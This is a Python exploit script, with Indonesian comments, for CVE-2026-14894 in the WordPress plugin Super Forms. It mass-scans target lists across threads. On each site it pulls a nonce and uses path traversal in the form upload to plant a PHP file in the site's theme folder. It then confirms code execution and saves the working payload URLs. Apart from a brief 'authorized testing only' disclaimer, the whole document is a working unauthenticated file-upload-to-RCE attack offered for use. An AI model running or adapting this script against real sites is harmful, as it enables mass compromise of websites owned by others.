#!/usr/bin/env python3
"""
CVE-2026-14894 - Super Forms <= 6.3.313
MASS AUTO-UPLOAD + VERIFY (unauth arbitrary file upload -> RCE)

FOR AUTHORIZED SECURITY TESTING ONLY.

Fitur:
  - Baca target dari file (-l) atau single (-u)
  - Multi-thread (--threads)
  - Auto detect theme + nonce
  - Upload payload PHP ke folder theme
  - Auto verify eksekusi
  - Simpan hasil rentan ke file (--out)
  - Retry (--retries) dan delay antar-request
"""
import argparse
import base64
import json
import os
import random
import re
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PHP_PAYLOAD = "<?php echo 'CVE-2026-14894-sfrce'; die(); ?>"
MARKER = "CVE-2026-14894-sfrce"

# Lock untuk penulisan file hasil paralel
OUT_LOCK = threading.Lock()


def rand_str(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def normalize(url):
    url = url.strip()
    if not url:
        return None
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def load_targets(args):
    targets = []
    if args.url:
        u = normalize(args.url)
        if u:
            targets.append(u)
    if args.list:
        with open(args.list, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                u = normalize(line)
                if u:
                    targets.append(u)
    # dedup preserve order
    seen = set()
    uniq = []
    for t in targets:
        if t not in seen:
            seen.add(t)
            uniq.append(t)
    return uniq


def build_session(args):
    s = requests.Session()
    s.verify = args.verify_tls
    s.timeout = args.timeout
    if args.proxy:
        s.proxies = {"http": args.proxy, "https": args.proxy}
    if args.cookie:
        s.headers["Cookie"] = args.cookie
    s.headers["User-Agent"] = args.user_agent
    return s


def http_with_retry(fn, args):
    last_err = None
    for attempt in range(args.retries + 1):
        try:
            return fn()
        except requests.RequestException as e:
            last_err = e
            if attempt < args.retries:
                time.sleep(args.delay)
    raise last_err


def detect_theme(s, base, args):
    def _do():
        return s.get(base, allow_redirects=True)
    r = http_with_retry(_do, args)
    if "/wp-content/themes" not in r.text:
        return None
    m = re.search(r"wp-content/themes/([a-zA-Z0-9_-]+)/", r.text)
    return m.group(1) if m else None


def get_nonce(s, base, args):
    url = f"{base}/wp-admin/admin-ajax.php?action=super_create_nonce"
    def _do():
        return s.post(url, data={"action": "super_create_nonce"})
    r = http_with_retry(_do, args)
    m = re.search(r"([a-f0-9]{10,})", r.text)
    return m.group(1) if m else None


def upload_payload(s, base, nonce, theme, filename, args):
    target_path = f"../../../../../themes/{theme}/{filename}"
    data_uri = "data:image/png;base64," + base64.b64encode(
        PHP_PAYLOAD.encode()
    ).decode()

    payload = {
        "sf_upload_field": {
            "type": "files",
            "files": [{
                "value": target_path,
                "datauristring": data_uri,
                "name": filename,
                "label": "attachment",
            }],
        }
    }
    url = f"{base}/wp-admin/admin-ajax.php?action=super_submit_form"
    body = {"sf_nonce": nonce, "form_id": "1", "data": json.dumps(payload)}

    def _do():
        return s.post(url, data=body)
    return http_with_retry(_do, args)


def verify(s, base, theme, filename, args):
    url = f"{base}/wp-content/themes/{theme}/{filename}"
    def _do():
        return s.get(url)
    r = http_with_retry(_do, args)
    return (r.status_code == 200 and MARKER in r.text), url


def save_result(out_path, line):
    if not out_path:
        return
    with OUT_LOCK:
        with open(out_path, "a", encoding="utf-8") as f:
            f.write(line + "\n")


def scan_one(target, args):
    """Return dict: status, url, theme, payload_url, error"""
    result = {"target": target, "status": "unknown", "theme": None,
              "payload_url": None, "error": None}
    try:
        s = build_session(args)

        # 1. detect
        theme = detect_theme(s, target, args)
        if not theme:
            result["status"] = "not-wp"
            return result
        result["theme"] = theme

        # 2. nonce
        nonce = get_nonce(s, target, args)
        if not nonce:
            result["status"] = "no-nonce"
            return result

        # 3. upload
        fname = f"{rand_str()}.php"
        r = upload_payload(s, target, nonce, theme, fname, args)
        if r.status_code not in (200, 302):
            result["status"] = f"upload-fail({r.status_code})"
            return result

        if args.delay:
            time.sleep(args.delay)

        # 4. verify
        ok, purl = verify(s, target, theme, fname, args)
        result["payload_url"] = purl
        result["status"] = "VULNERABLE" if ok else "uploaded-unverified"
        return result

    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)[:200]
        return result


def worker(target, args):
    res = scan_one(target, args)
    tag = res["status"]

    # color-ish prefix
    if tag == "VULNERABLE":
        prefix = "[+]"
    elif tag in ("not-wp", "no-nonce", "upload-fail") or tag.startswith("upload-fail"):
        prefix = "[-]"
    elif tag == "uploaded-unverified":
        prefix = "[?]"
    elif tag == "error":
        prefix = "[!]"
    else:
        prefix = "[*]"

    line = f"{prefix} {target} | {tag}"
    if res["theme"]:
        line += f" | theme={res['theme']}"
    if res["payload_url"]:
        line += f" | {res['payload_url']}"
    if res["error"]:
        line += f" | err={res['error']}"

    print(line, flush=True)

    # Simpan hasil rentan + payload url
    if tag == "VULNERABLE" and args.out:
        save_result(args.out, res["payload_url"])
    elif tag == "uploaded-unverified" and args.out:
        save_result(args.out, f"UNVERIFIED {res['payload_url']}")

    return res


def main():
    p = argparse.ArgumentParser(
        description="CVE-2026-14894 auto mass upload (authorized testing only)"
    )
    p.add_argument("-u", "--url", help="Single target")
    p.add_argument("-l", "--list", help="File berisi list target (1 per baris)")
    p.add_argument("-t", "--threads", type=int, default=10, help="Jumlah thread (default 10)")
    p.add_argument("--out", help="File output payload rentan (append)")
    p.add_argument("--proxy", help="Proxy, mis. http://127.0.0.1:8080")
    p.add_argument("--cookie", help="Cookie header tambahan (opsional)")
    p.add_argument("--timeout", type=int, default=15)
    p.add_argument("--retries", type=int, default=1, help="Retry per request")
    p.add_argument("--delay", type=float, default=0.0, help="Delay antar step (detik)")
    p.add_argument("--no-verify", dest="verify_tls", action="store_false",
                   help="Matikan verifikasi TLS")
    p.add_argument("--user-agent", default="Mozilla/5.0 (CVE-2026-14894 scanner)")
    args = p.parse_args()

    if not args.url and not args.list:
        p.error("Butuh -u atau -l")

    targets = load_targets(args)
    if not targets:
        print("[-] Tidak ada target valid.")
        sys.exit(2)

    print(f"[*] Total target : {len(targets)}")
    print(f"[*] Threads      : {args.threads}")
    print(f"[*] Output file  : {args.out or '-'}")
    print("-" * 70)

    vuln = 0
    unverified = 0
    not_wp = 0
    no_nonce = 0
    err = 0

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = {ex.submit(worker, t, args): t for t in targets}
        for fut in as_completed(futures):
            try:
                res = fut.result()
            except Exception as e:
                print(f"[!] Thread crash: {e}", flush=True)
                err += 1
                continue
            st = res["status"]
            if st == "VULNERABLE":
                vuln += 1
            elif st == "uploaded-unverified":
                unverified += 1
            elif st == "not-wp":
                not_wp += 1
            elif st == "no-nonce":
                no_nonce += 1
            elif st == "error":
                err += 1

    print("-" * 70)
    print(f"[SUMMARY] total={len(targets)} vuln={vuln} unverified={unverified} "
          f"not-wp={not_wp} no-nonce={no_nonce} error={err}")
    if args.out and (vuln or unverified):
        print(f"[+] Hasil disimpan di: {args.out}")

    sys.exit(0 if vuln else 1)


if __name__ == "__main__":
    main()
